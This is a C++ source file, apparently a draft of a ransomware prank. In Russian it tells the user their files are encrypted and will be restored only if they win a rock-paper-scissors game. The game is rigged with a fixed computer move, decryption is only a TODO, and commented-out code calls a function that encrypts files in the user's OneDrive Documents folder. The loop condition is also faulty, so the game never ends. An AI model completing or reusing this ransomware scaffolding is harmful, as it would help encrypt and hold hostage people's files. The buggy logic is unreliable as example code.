#include "shifr.h"
#include <random>
#include <cassert> // для assert()

int main()
{
    setlocale(LC_ALL, "russian");

    short random_number, ourPoints = 0, theirPoints = 0;
    string choice;
    vector<string> material = { "Stone", "Scissors", "Paper" };

    cout << "Вашы файлы были зашифрованы, чтобы вернуть файлы вам нужно победить в игре камень, ножницы, бумага." << endl;
    cout << "Наш ход будет абсолютно рандомным." << endl;
    cout << "Правила:\n 1. Возможные ходы: камень, ножницы, бумага.\n 2. Камень побеждает ножницы, ножницы побеждают бумагу, бумага побеждает камень\n 3. Если ходы совпадают, то переигрываем.\n 4. Играем до 3-х очёк\n 5. Если выигрывает программа файлы остаются зашыфроваными, если же вы, то все файлы будут расшифрованы. Желаем удачи!)" << endl;

    // Генерация случайного числа в заданном диапазоне
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> distribution(0, 2);

    while (ourPoints != 3 || theirPoints != 3) {
        //random_number = distribution(gen);
        random_number = 2;
        cout << "Введите ваш выбор(Первая буква большая, названия только на АНГЛИЙСКОМ Stone, Paper, Scissors): "; cin >> choice;
        if (choice != "Stone" && choice != "Scissors" && choice != "Paper") {
            cout << "Такого хода не существует!" << endl;
            choice.clear();
            continue;
        }
        cout << "Наш ход: " << material[random_number] << endl;

        if (material[random_number] == choice) {
            cout << "Наши хода совпали, переигрываем.";
            continue;
        }
        else if (material[random_number] == "Stone") {
            if (choice == "Scissors") {
                cout << "Проигришь((. Камень побеждает ножницы. Наши очки: " << ++ourPoints << ". Ваши очки: " << theirPoints << endl;
            }
            else {
                cout << "Победа!). Бумага побеждает камень. Наши очки: " << ourPoints << ". Ваши очки: " << ++theirPoints << endl;
            }
        }
        else if (material[random_number] == "Scissors") {
            if (choice == "Paper") {
                cout << "Проигришь((. Ножницы побеждают бумагу. Наши очки: " << ++ourPoints << ". Ваши очки: " << theirPoints << endl;
            }
            else {
                cout << "Победа!). Камень побеждает ножницы. Наши очки: " << ourPoints << ". Ваши очки: " << ++theirPoints << endl;
            }
        }
        else {
            if (choice == "Stone") {
                cout << "Проигришь((. Бумага побеждает камень. Наши очки: " << ++ourPoints << ". Ваши очки: " << theirPoints << endl;
            }
            else {
                cout << "Победа!). Ножницы побеждают бумагу. Наши очки: " << ourPoints << ". Ваши очки: " << ++theirPoints << endl;
            }
        }
        choice.clear();
    }

    if (ourPoints > theirPoints) {
        cout << "К сожалению вы проиграли и по этому все файлы останутся зашифроваными(" << endl;
        //TODO Скорее всего просто выходим из программы 
    }
    else {
        cout << "Поздравляем)). Вы победили, мы здержим свое обещание а расшифруем файлы" << endl;
        //TODO Вызываем функцию расшифровки файлов
    }




    //string username, filePath;
    //shifr a;
    //username = a.getUserName();
    //filePath = "C:\\Users\\" + username + "\\OneDrive\\Documents\\testFolder";
    //a.encryptFilesInDirectory(filePath);
}